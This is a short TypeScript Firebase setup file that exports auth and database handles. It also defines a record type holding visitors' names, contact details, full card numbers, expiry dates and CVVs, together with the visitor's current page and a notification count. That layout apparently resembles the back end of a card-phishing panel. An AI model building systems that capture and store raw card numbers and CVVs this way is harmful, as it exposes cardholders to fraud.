import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAjRRxPZDG1Gu9V48Y57gfM0Lmhovi5S60",
  authDomain: "qa-lioha-ll.firebaseapp.com",
  databaseURL: "https://qa-lioha-ll-default-rtdb.firebaseio.com",
  projectId: "qa-lioha-ll",
  storageBucket: "qa-lioha-ll.firebasestorage.app",
  messagingSenderId: "624165287977",
  appId: "1:624165287977:web:4830bd0b4a15513bd0c438",
  measurementId: "G-91P5KMKJEK"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

